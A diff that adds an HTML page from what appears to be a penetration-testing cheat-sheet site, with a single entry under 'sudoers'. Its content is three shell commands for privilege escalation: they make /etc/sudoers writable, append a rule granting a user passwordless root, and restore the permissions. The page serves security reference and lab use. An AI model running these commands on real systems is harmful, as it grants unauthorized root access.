@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>sudoers | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/sudoers/">
+      <span>sudoers</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@sudoers/">Sudoers</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@sudo/">Sudo</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@privesc/">Privesc</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@/etc/sudoers/">/Etc/Sudoers</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="privesc">Privesc</h3>
+<h4 id="abuse-etcsudoers">Abuse <code>/etc/sudoers</code></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># IF you have control over `/etc/sudoers`</span>
+</span></span><span class="line"><span class="cl">chmod <span class="m">666</span> /etc/sudoers
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;user   ALL=(ALL) NOPASSWD: ALL&#39;</span> &gt;&gt; /etc/sudoers
+</span></span><span class="line"><span class="cl">chmod <span class="m">440</span> /etc/sudoers
+</span></span></code></pre></div><br>
+</div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
